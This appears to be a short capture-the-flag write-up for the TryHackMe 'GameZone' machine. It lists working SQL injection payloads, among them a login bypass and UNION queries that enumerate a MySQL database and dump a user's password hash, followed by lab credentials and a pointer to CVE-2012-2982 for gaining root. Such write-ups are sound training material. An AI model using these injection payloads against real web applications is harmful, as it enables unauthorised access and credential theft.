# THM: GameZone
# OS: Linux (Easy)

----
[NOTES]
- agent47 creds:
  agent47:videogamer124
- agent 47 can SSH
- MySQL root creds:
  root:3kSMMS47qZEBgFUe

----

## Foothold

[WEB]
**Port -> 80**

- Found SQLi on http://$ip/portal.php
  `' OR 1=1-- -`
  `' UNION SELECT 1,2,3-- -`

### SQLi

**Find databases**
```mysql
' UNION SELECT 1,2,schema_name FROM information_schema.schemata-- -
```
```databases
information_schema
db
mysql
performance_schema
sys
```

**Find tables in `db`**
```mysql
' UNION SELECT 1,table_schema,table_name FROM information_schema.tables WHERE table_schema = 'db' AND table_schema != 'information_schema'-- -
```
```tables (db)
db	post
db	users
```

**Find columns in `users`**
```mysql
' UNION SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema = 'db'-- -
```
```columns (db)
post	id
post	name
post	description
users	username
users	pwd
```

**Get user passwords**
```mysql
' UNION SELECT 1,2,CONCAT(username,':',pwd) FROM users-- -
```
```username:password
agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
```

----
----

## PrivEsc

SSH in with `agent47:videogamer124`

----

[WEB]

`netstat -nltp` show us there is an internal web page on 10000

CVE found:
  CVE-2012-2982

Use the CVE and get root
